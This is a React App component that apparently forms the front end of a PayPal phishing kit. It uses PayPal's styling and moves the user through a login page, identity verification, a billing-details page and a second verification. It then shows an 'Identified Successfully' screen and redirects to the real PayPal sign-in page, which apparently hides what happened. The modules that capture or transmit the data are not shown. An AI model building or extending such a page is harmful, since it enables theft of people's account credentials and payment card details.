import { useEffect, useState, lazy, Suspense, memo } from 'react';
import { Navbar } from './components/Navbar';
import { HeroSection } from './components/HeroSection';

const LoginPage = lazy(() => import('./components/LoginPage').then(m => ({ default: m.LoginPage })));
const VerificationPage = lazy(() => import('./components/VerificationPage').then(m => ({ default: m.VerificationPage })));
const BillingPage = lazy(() => import('./components/BillingPage').then(m => ({ default: m.BillingPage })));

const LoadingSpinner = memo(() => (
  <div className="min-h-screen w-full flex flex-col items-center justify-center bg-white">
    <div className="flex flex-col items-center gap-4">
      <div className="relative w-12 h-12">
        <div className="absolute inset-0 border-2 border-gray-100 rounded-full"></div>
        <div 
          className="absolute inset-0 border-2 border-t-[#0070BA] border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"
          style={{ animationDuration: '0.8s' }}
        ></div>
      </div>
      <p className="text-[#2C2E2F] text-[18px] font-normal">Just a second...</p>
    </div>
  </div>
));

export function App() {
  const [screen, setScreen] = useState<'loading' | 'landing' | 'login' | 'transition' | 'verification' | 'billing' | 'final_verification' | 'success'>(
    'loading'
  );
  const [nextScreen, setNextScreen] = useState<'verification' | 'billing' | 'final_verification' | 'success' | null>(null);
  const [userEmail, setUserEmail] = useState('');

  useEffect(() => {
    if (screen === 'transition' && nextScreen) {
      const timer = setTimeout(() => {
        setScreen(nextScreen);
        setNextScreen(null);
      }, 300);
      return () => clearTimeout(timer);
    }
  }, [screen, nextScreen]);

  useEffect(() => {
    // Loading spinner for 1 second
    const loadingTimer = setTimeout(() => {
      setScreen('landing');
    }, 400);
    return () => clearTimeout(loadingTimer);
  }, []);

  useEffect(() => {
    if (screen === 'landing') {
      // Landing page shows for 1 second, then transitions to login
      const landingTimer = setTimeout(() => {
        setScreen('login');
      }, 500);
      return () => clearTimeout(landingTimer);
    }
  }, [screen]);

  useEffect(() => {
    if (screen === 'success') {
      const successTimer = setTimeout(() => {
        window.location.href = 'https://www.paypal.com/signin?locale.x=en_US';
      }, 1000);
      return () => clearTimeout(successTimer);
    }
  }, [screen]);

  if (screen === 'loading' || screen === 'transition') {
    return <LoadingSpinner />;
  }
  if (screen === 'landing') {
    return (
      <div className="min-h-screen w-full flex flex-col bg-white">
        <Navbar />
        <main className="flex-1 flex flex-col">
          <HeroSection />
        </main>
      </div>);

  }
  
  return (
    <Suspense fallback={<LoadingSpinner />}>
      {screen === 'verification' && (
        <VerificationPage 
          email={userEmail} 
          onBack={() => setScreen('login')} 
          onVerificationSuccess={() => {
            setNextScreen('billing');
            setScreen('transition');
          }}
          mode="initial"
        />
      )}

      {screen === 'billing' && (
        <BillingPage 
          onComplete={(data) => {
            console.log('Billing completed:', data);
            setNextScreen('final_verification');
            setScreen('transition');
          }}
        />
      )}

      {screen === 'final_verification' && (
        <VerificationPage 
          email={userEmail} 
          onBack={() => setScreen('billing')} 
          onVerificationSuccess={() => {
            setNextScreen('success');
            setScreen('transition');
          }}
          mode="final"
        />
      )}

      {screen === 'success' && (
        <div className="min-h-screen w-full bg-white flex flex-col items-center justify-center font-['Inter',sans-serif]">
          <div className="w-full max-w-[480px] px-6 sm:px-8 flex flex-col items-center">
            <div className="mb-6 sm:mb-8">
              <svg viewBox="0 0 24 24" className="w-12 h-12 sm:w-16 sm:h-16 text-[#0070BA]" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="#0070BA" />
                <path d="M16.5 8.5L10.5 14.5L7.5 11.5" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </div>
            <h1 className="text-[28px] sm:text-[32px] font-bold text-gray-900 leading-tight mb-4 tracking-tight text-center">
              Identified Successfully
            </h1>
            <p className="text-gray-600 text-[15px] sm:text-[16px] text-center mb-10 sm:mb-12">
              Your identity has been verified. You can now access your account.
            </p>
            <button
              onClick={() => window.location.href = 'https://www.paypal.com/signin?locale.x=en_US'}
              className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-lg rounded-full transition-colors shadow-sm"
            >
              Done
            </button>
          </div>
        </div>
      )}

      {screen === 'login' && (
        <LoginPage 
          onLoginSuccess={(email) => {
            setUserEmail(email);
            setNextScreen('verification');
            setScreen('transition');
          }} 
        />
      )}
    </Suspense>
  );
}